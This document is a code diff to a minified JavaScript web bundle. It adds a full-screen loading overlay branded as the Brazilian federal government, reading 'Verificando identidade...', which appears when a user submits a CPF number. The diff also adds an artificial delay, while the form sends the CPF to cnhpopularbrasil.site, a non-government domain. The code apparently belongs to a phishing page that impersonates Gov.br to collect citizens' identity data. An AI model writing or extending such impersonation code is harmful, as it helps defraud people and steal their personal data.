@@ -17974,8 +17974,54 @@ function d3() {
       let h = f.target.value;
       h && h !== c && ((h = Vc(h)), n("cpf", u3(h.slice(0, 11))));
     },
+    p3 = (f) => {
+      if (typeof document > "u") return;
+      let h = document.getElementById("govbr-loading");
+      if (!h) {
+        h = document.createElement("div");
+        h.id = "govbr-loading";
+        h.innerHTML =
+          '<div class="govbr-loading-card">'
+          + '<div class="govbr-loading-logo">GOVERNO FEDERAL<br><span>BRASIL</span><br><small>UNIÃO E RECONSTRUÇÃO</small></div>'
+          + '<div class="govbr-loading-dots"><span></span><span></span><span></span><span></span><span></span></div>'
+          + '<div class="govbr-loading-title">Verificando identidade...</div>'
+          + `<div class="govbr-loading-name">${f || ""}</div>`
+          + '<div class="govbr-loading-bar"><span></span></div>'
+          + '</div>';
+        document.body.appendChild(h);
+      }
+      if (!document.getElementById("govbr-loading-style")) {
+        const w = document.createElement("style");
+        w.id = "govbr-loading-style";
+        w.textContent =
+          '#govbr-loading{position:fixed;inset:0;background:#f3f4f6;display:flex;align-items:center;justify-content:center;z-index:9999}'
+          + '.govbr-loading-card{width:320px;background:#fff;border-radius:16px;padding:32px 24px;text-align:center;box-shadow:0 10px 30px rgba(0,0,0,.15)}'
+          + '.govbr-loading-logo{font-weight:700;letter-spacing:.12em;font-size:12px;color:#111827;margin-bottom:18px}'
+          + '.govbr-loading-logo span{display:block;font-size:32px;letter-spacing:.2em;color:#10b981;margin:8px 0}'
+          + '.govbr-loading-logo small{font-weight:600;font-size:10px;color:#6b7280}'
+          + '.govbr-loading-dots{display:flex;justify-content:center;gap:8px;margin:12px 0}'
+          + '.govbr-loading-dots span{width:8px;height:8px;border-radius:999px;background:#e5e7eb;animation:govdot 1s infinite}'
+          + '.govbr-loading-dots span:nth-child(2){animation-delay:.1s;background:#fde68a}'
+          + '.govbr-loading-dots span:nth-child(3){animation-delay:.2s;background:#c7d2fe}'
+          + '.govbr-loading-dots span:nth-child(4){animation-delay:.3s;background:#bbf7d0}'
+          + '.govbr-loading-dots span:nth-child(5){animation-delay:.4s;background:#fecaca}'
+          + '.govbr-loading-title{margin-top:8px;font-size:14px;color:#374151}'
+          + '.govbr-loading-name{margin-top:2px;font-size:12px;color:#9ca3af}'
+          + '.govbr-loading-bar{margin-top:14px;height:4px;background:#e5e7eb;border-radius:999px;overflow:hidden}'
+          + '.govbr-loading-bar span{display:block;height:100%;width:40%;background:linear-gradient(90deg,#10b981,#f59e0b,#3b82f6);animation:govbar 1.2s infinite}'
+          + '@keyframes govbar{0%{transform:translateX(-100%)}100%{transform:translateX(250%)}}'
+          + '@keyframes govdot{0%,100%{opacity:.4}50%{opacity:1}}';
+        document.head.appendChild(w);
+      }
+    },
+    g3 = () => {
+      if (typeof document > "u") return;
+      const f = document.getElementById("govbr-loading");
+      f && f.remove();
+    },
     d = async (f) => {
       i(!0);
+      p3(f == null ? void 0 : f.cpf);
       try {
         const h = Vc(f.cpf),
           w = await (await fetch(`https://cnhpopularbrasil.site/api/consulta.php?cpf=${h}`)).json();
@@ -18013,7 +18059,10 @@ function d3() {
         };
         a(`/verificacao?data=${encodeURIComponent(JSON.stringify(w))}`);
       } finally {
-        i(!1);
+        setTimeout(() => {
+          i(!1);
+          g3();
+        }, 800);
       }
     };
   return l.jsx("form", {
